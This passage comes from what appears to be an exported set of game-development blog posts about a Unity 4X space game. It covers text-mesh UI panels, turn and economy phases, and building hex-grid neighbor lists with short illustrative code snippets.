screwed up big time so I changed that to 3D text mesh. The results are pleasing.\n\n![](/img/pasip1.png)\n\nhe planet names are 3 arrays of 5 meaningless names and a unique selection is made at random from these arrays.\n\nWhile at the subject of panes I also changed the ship info pane to a text mesh. The previous videos had examples of UI text and how ugly it looks when rotated as the ship info text. Now it\u2019s much smoother:\n\n![](/img/pasip2.png)\n\nOne of the tricky things here was to keep the text facing towards the user as the ship rotates. The text is a child component of the ship, and is positioned 0,0,-10 relative to the ship. When the ship rotates so does the axis for the text and it would end up in different positions for each rotation of the ship. To keep it below the ship for all rotation the positioning has to be with respect to the world axis. To accomplish this I had to get the TransformPoint for the ship location with respect to the ships origin and add the difference vector. Now when you set the position of the text you get this effect. Something along the lines of\n\n```\nVector3 p = ship.asset.transform.TransformPoint (Vector3.zero);\ntext.transform.position = p + new Vector3 (0, 0, -10f);\n```\n\nHere is some video action\n\n![](/img/h7.gif)", "file": "planets_and_some_info_panels.ipynb"}, {"title": "turn processing and economy", "body": "\n2 easy parts don\u2019t require much on the 3D side, but are a pain on the GUI part. The unity GUI is quite inferior compared to the browser that I can say. As far as I can guess it was even worse in 4.x and this is the revamped GUI system in unity 5 which still not that good. So the turn system. Turns are conducted in phases.\n\n1. Movement/exploration/combat turn\n1. Economical phase\n\nEvery 4 turns there is an economy return the others are for moving around, colonizing etc. During the movement phase the player still collects income from the colonies and pays ship maintenance costs but cannot buy ships or do research. In the economy phase the player cannot do the things done in the movement phase, but does the things not allowed in the movement phase. Every turn the ships also generate power and burn fuel.\n\nAt the beginning of the economy turn the player collects the income and pays the maintenance costs and whatever is left over he can use to purchase ships or technology. There is a nice report that displays what happened economy wise at the beginning of the turn like this\n\n![](/img/tpae1.png)\n\nOne thing to mention is that if there is an enemy ship in the neighbor cells of a colony then it will not produce any income. All the colonist are fearing for their lives and will not work.\n\nI\u2019ve also added a nice bar at the top that displays the current star date and the credit points the player has and a button to confirm that the turn has ended.\n\n![](/img/tpae2.png)", "file": "turn_processing_and_economy.ipynb"}, {"title": "hex grid neighbors", "body": "\nIn the graph based storage of hex grids an important function for the cells is for them to keep track of their neighbor cells.\n\nOne way you can build the neighbors list is as you are constructing the grid itself. This can be done on a direction basis. Each cell has the following the directions:\n\n1. NW (northwest)\n1. NE (northeast)\n1. E (east)\n1. SE (southeast)\n1. SW (southwest)\n1. W (west)\n\n\nWe will use an array of size 6 in each cell to store the neighbors. Each position in the array will correspond to a direction. It doesn\u2019t really matter which index is which position as long as your are consistent about it. If you use an enumeration structure you will automatically assign integers for each direction, which you can then use as the indices for the neighbors array. Keep in mid that not every cell has exactly 6 surrounding cells. Depending on the position on the board some cells may have 3 or 5 but never more than 6. Here is an example to clarify things:\n\nLet\u2019s assume the following values for the 6 directions:\n\nNW = 0, NE = 1, E = 2, SE = 3, SW = 4, W = 5\n\nAnd the Cell object will have a structure similar to `Cell[] neighbors = new Cell[6];`\n\nif the cell we are looking at has a neighbor on the NW side, then neighbors[0] \nwill point to the neighbor cell. Incidentally the neighboring cells neighbors \narray would have the original cell at the SE (3) position. So this relation \nholds:\n\nFor cells with 6 neighbors the original cell is refers to it\u2019s neighbors in a \ndirection and the neighbors refer to the original cell in the opposite direction.\n\nHow can we calculate the opposite direction? Quite easy: The position you \nwant + 3 modulo 6. The module will make the directions wrap around after \nreaching the end of the direction array.\n\nOk so let\u2019s start of with the easiest direction: the W \u2013 E connection.\n\n![](/img/hgn1.png)\n\nIn this diagram the white arrows show the W-E relationship between cells. \nRemember that we are populating the neighbor list as we create the grid, so the \nneighboring cells must exist before we can add their pointers to the neighbor \nlist. If we start from the bottom left corner, the first cell has no neighbors \nto the W, so we can skip that. On to the second cell to its right. This guy has\na neighbor to the west so we can add this to the list, and the opposite neighbor \nrelation also holds. We can do this for the rest of this row, and go on to the \nnext row. On the next row, the same is true: skip the first add the rest. So the\ncondition for creating the E/W relation can be written\n\n```\nfunction addCell(x,z,i) {\n \n if (x > 0)\n {\n  cell.neighbors[W] = cells[i - 1];\n  cells[i-1].neighbors[W + 3 % 6] = cell;\n }\n \n}\n```\n\nThe assumption here is that all the cells in the grid are stored in an array called cells. This is a 1 dimensional array. I felt that this may be a bit counter intuitive and deserved a remark. The function will be called for each X, Z coordinate with the position of the cell in the cells array.\n\nFor the SW and SE relations we need to distinguish between the cases of even and odd rows. Why? because the the first and last hex of the rows change which neighbors they have. The first element of the 2. row (index 1 so odd) has a SW and SE neighbor but the last hex is missing a SE neighbor. The first element of the 3rd row (index 2) is missing the SW neighbor. None of the cells on the first row have a SE or SW neighbor. So our conditions are:\n\n```\nif (z > 0 ) {\n if (z % 2 == 0) {\n  ...\n } else {\n  ...\n }\n}\n```\n\nLet\u2019s take a look at the even case, the purple and orange arrows:\n\nThe first cell doesn\u2019t have a SW neighbor, so that\u2019s will be a special case. The rest of the cells have both neighbors.\n\n```\nif (z % 2 ==0) {\n cell.neighbors[SE] = cells[i - width]\n //add the opposite too\n if (x > 0) {\n  cell.neighbors[SW] = cells[i - width - 1] \n  //add the opposite too\n }\n}\n\n//The odd case (yellow and green arrows):\n\nif (z % 2 == 0) {\n...\n} else {\n cell.neighbors[SW] = cells[i - width]\n //add the opposite\n if (x < width - 1) {\n  cell.neighbors[SE] = cells[i-width+1]\n  //add the opposite\n }\n}\n```\n", "file": "hex_grid_neighbors.ipynb"}, {"title": "epic4x: devlog #6", "body": "\n\nPosted on March 1, 2017 by dendiz\nThe gui got some love today with the addition of a button that says \u201c+building\u201d \nthat will start the construction of a building on a surface tile. I also \ncleaned up some messy code on the server side that was related to storing \nsome definitions about building cost, maintenance, const
